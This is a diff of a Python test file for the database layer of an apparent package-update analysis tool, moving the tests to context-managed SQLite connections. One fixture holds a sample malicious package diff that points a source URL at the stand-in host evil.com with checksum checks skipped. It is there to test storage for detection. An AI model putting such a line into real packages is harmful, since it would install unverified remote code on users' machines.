@@ -24,15 +24,14 @@ def db(tmp_path, monkeypatch):
 
 
 def test_init_db_creates_tables(db):
-    conn = get_connection()
-    tables = conn.execute("SELECT name FROM sqlite_master WHERE type='table' ORDER BY name").fetchall()
-    table_names = [r["name"] for r in tables]
+    with get_connection() as conn:
+        tables = conn.execute("SELECT name FROM sqlite_master WHERE type='table' ORDER BY name").fetchall()
+        table_names = [r["name"] for r in tables]
     assert "packages" in table_names
     assert "source_urls" in table_names
     assert "maintainers" in table_names
     assert "analysis_history" in table_names
     assert "triggered_rules" in table_names
-    conn.close()
 
 
 def test_upsert_package_new(db):
@@ -44,7 +43,7 @@ def test_upsert_package_new(db):
 def test_upsert_package_existing(db):
     pid1 = upsert_package("testpkg", "1.0.0")
     pid2 = upsert_package("testpkg", "2.0.0")
-    assert pid1 == pid2  # same package returns same id via name lookup
+    assert pid1 == pid2
 
 
 def test_get_package_id_found(db):
@@ -128,7 +127,7 @@ def test_get_history(db):
         insert_analysis(pid, f"{i}.0", f"{i+1}.0", "a", "b", i * 10, "+d", "{}", [])
     history = get_history(pid, limit=3)
     assert len(history) == 3
-    assert history[0]["final_score"] == 40  # most recent first
+    assert history[0]["final_score"] == 40
 
 
 def test_get_all_packages(db):
@@ -143,38 +142,35 @@ def test_get_all_packages(db):
 def test_source_url_unique_constraint(db):
     upsert_package("testpkg", "1.0")
     pid = get_package_id("testpkg")
-    conn = get_connection()
-    conn.execute(
-        "INSERT INTO source_urls (url, first_seen_package_id, first_seen_globally_timestamp) VALUES (?, ?, datetime('now'))",
-        ("https://unique-url.com/pkg.tar.gz", pid),
-    )
-    conn.commit()
-    with pytest.raises(Exception):
+    with get_connection() as conn:
         conn.execute(
-            "INSERT INTO source_urls (url, first_seen_package_id) VALUES (?, ?)",
+            "INSERT INTO source_urls (url, first_seen_package_id, first_seen_globally_timestamp) VALUES (?, ?, datetime('now'))",
             ("https://unique-url.com/pkg.tar.gz", pid),
         )
         conn.commit()
-    conn.close()
+        with pytest.raises(Exception):
+            conn.execute(
+                "INSERT INTO source_urls (url, first_seen_package_id) VALUES (?, ?)",
+                ("https://unique-url.com/pkg.tar.gz", pid),
+            )
+            conn.commit()
 
 
 def test_foreign_key_enforced(db):
     with pytest.raises(Exception):
-        conn = get_connection()
-        conn.execute(
-            "INSERT INTO analysis_history (package_id, old_version, new_version) VALUES (99999, '1.0', '2.0')",
-        )
-        conn.commit()
-        conn.close()
+        with get_connection() as conn:
+            conn.execute(
+                "INSERT INTO analysis_history (package_id, old_version, new_version) VALUES (99999, '1.0', '2.0')",
+            )
+            conn.commit()
 
 
 def test_analysis_stores_diff_blob(db):
     pid = upsert_package("myapp", "1.0")
     diff = "+source=('https://evil.com/payload.tar.gz')\n+sha256sums=('SKIP')"
     hid = insert_analysis(pid, "1.0", "2.0", "a", "b", 85, diff, "{}", [])
-    conn = get_connection()
-    row = conn.execute("SELECT raw_diff_blob FROM analysis_history WHERE id = ?", (hid,)).fetchone()
-    conn.close()
+    with get_connection() as conn:
+        row = conn.execute("SELECT raw_diff_blob FROM analysis_history WHERE id = ?", (hid,)).fetchone()
     assert row is not None
     assert "evil.com" in row["raw_diff_blob"]
 
@@ -183,7 +179,6 @@ def test_init_db_idempotent(db):
     init_db()
     init_db()
     init_db()
-    conn = get_connection()
-    tables = conn.execute("SELECT count(*) as cnt FROM sqlite_master WHERE type='table'").fetchone()
-    conn.close()
+    with get_connection() as conn:
+        tables = conn.execute("SELECT count(*) as cnt FROM sqlite_master WHERE type='table'").fetchone()
     assert tables["cnt"] >= 5
